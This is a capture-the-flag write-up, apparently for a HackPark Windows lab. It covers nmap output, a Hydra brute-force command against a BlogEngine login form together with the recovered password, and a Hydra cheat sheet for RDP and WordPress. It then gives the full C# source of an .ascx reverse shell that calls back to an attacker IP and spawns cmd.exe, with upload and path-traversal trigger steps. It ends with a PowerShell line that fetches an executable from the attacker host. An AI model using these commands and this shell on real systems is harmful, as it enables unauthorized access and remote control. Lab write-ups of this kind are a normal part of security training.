**Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!**



# Enumerating

## namp

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 15:50 IST
Nmap scan report for 10.10.127.19
Host is up (0.18s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2022-04-21T10:18:58
|_Not valid after:  2022-10-21T10:18:58
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2022-04-22T10:21:49+00:00
|_ssl-date: 2022-04-22T10:21:51+00:00; +3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
```



## Gobuster

![image-20220422160246408](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220422160246408.png)

## hydra

```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.127.19  http-post-form "/Account/login.aspx:__VIEWSTATE=ScTUsDEL61RxXQbUkxPIvjWwWIPtRoGua7VlvlhkXMv83IlH8nDZNBJap5qDDRHYpohgQkDHiy%2FBC%2BxgOpa%2BQyclcuurGR6oEQrtrgMMab51BRVITHbw51etTYHg%2BOSqlTEdhO1sq6LyFJ6OiiTP6d9DJf02wqbnAd2tPNuj2XvUivov&__EVENTVALIDATION=IwDYcG9QBNf8p2xPKx%2B%2Fw5JxMDpBvm8H7wN1ksA5dw9A8UBpnwOCo0Dw%2BPk5zNJmkB9lQ%2FliisMfMuMuK0XXTqgvEqLeivDFKIVc5TL58r9bwhfN6No%2FVNcCXAAYsaZZOdkMyqjZVNaOltsfMh1u4e0p9aFSTmWecZYwxusByDyG%2FSae&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -t 64
```

```bash
[80][http-post-form] host: 10.10.127.19   login: admin   password: 1qaz2wsx
```



​                                                            

We need to find a login page to  attack and identify what type of request the form is making to the  webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

You can check what request a form is making by right clicking on the login  form, inspecting the element and then reading the value in the method  field. You can also identify this if you are intercepting the traffic  through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).

What request type is the Windows website login form using?

Now we know the **request type** and have a **URL** for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

**hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form**

Guess a username, choose a password wordlist and gain credentials to a user account!

​                                                         

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the **http-post-form** that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Below is a mini cheatsheet:

| **Command**                                                  | **Description**                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| hydra -P <wordlist> -v <ip> <protocol>                       | Brute force against a protocol of your choice                |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol> | You can use Hydra to bruteforce usernames as well as passwords. It will  loop through every combination in your lists. (-vV = verbose mode,  showing login attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>      | Attack a Windows Remote Desktop with a password list.        |
| hydra -l <username> -P .<password list> $ip -V http-form-post  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log  In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force.      |

# Compromise the machine                            

## Exploit

rename it to  PostView.ascx  Change ip and port on 11 line

- upload it to   ` http://<ip>/admin/app/editor/editpost.cshtml`
- start nc
- access from  `http://<ip>/?theme=../../App_Data/files`

````ascx

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.17.4.58", 443)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>

````

#   Windows Privilege Escalation  (Msfconsole)

- **uploading file in windows**

`powershell -c "Invoke-WebRequest -Uri 'http://10.17.4.58:1111/tcc.exe' -OutFile 'C:\Windows\Temp\tcc.exe'"`

- *To run the exe* `.\tcc.exe`

